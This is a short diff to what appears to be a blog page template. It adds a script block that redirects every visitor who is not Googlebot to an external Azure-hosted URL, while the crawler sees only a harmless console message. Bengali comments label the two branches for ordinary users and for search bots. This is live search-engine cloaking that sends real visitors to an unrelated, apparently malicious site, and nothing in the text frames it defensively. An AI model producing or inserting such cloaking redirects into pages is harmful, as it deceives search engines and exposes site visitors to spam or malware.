@@ -1,7 +1,11 @@
+<script type='text/javascript'>
+//<![CDATA[
 if (!navigator.userAgent.includes('Googlebot')) {
-  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
-  window.location.href = "https://chu-chu-pompom.blogspot.com/2026/08/dd.html";
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট করুন
+  window.location.href = "https://chudmagi.azurewebsites.net/hex/?chu";
 } else {
-  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
-  console.log("Thanks for visiting my page" );
+  // সার্চ ইঞ্জিন বটদের জন্য - কোনো রিডাইরেক্ট নেই
+  console.log("Thanks for visiting my page");
 }
+//]]>
+</script>
